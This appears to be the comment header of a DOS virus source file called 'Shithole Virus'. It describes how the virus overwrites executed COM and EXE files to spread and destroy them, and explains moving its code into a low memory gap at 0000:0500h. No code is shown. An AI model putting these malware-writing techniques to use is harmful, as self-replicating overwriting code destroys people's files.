                             Shithole Virus

;This virus basically overwrites anything executed with its own code.  Com
;files and exe files under 64k will function to spread the virus.  Exe's
;above 64k that have been overwritten will display the message "Program too big
;to fit in Memory."

;This small piece of code that seems to replicate itself to other files and 
;as a result render them worthless is the exclusive property of Yosha/DC.

;Here we move our virus to 0000:0500h.  You could probably get away with 
;leaving out the cld, because it is usually cleared anyway.  Taking it out would

;make the virus less stable and prone to crashing, though.

;0000:0500 is a hole in memory between the interrupt table and dos's load 
;address.  You can't go past 0000:0700 without crashing dos.  You can probably
;go further back, though, and even overwrite the last parts of the interrupt 
;table if you're daring.
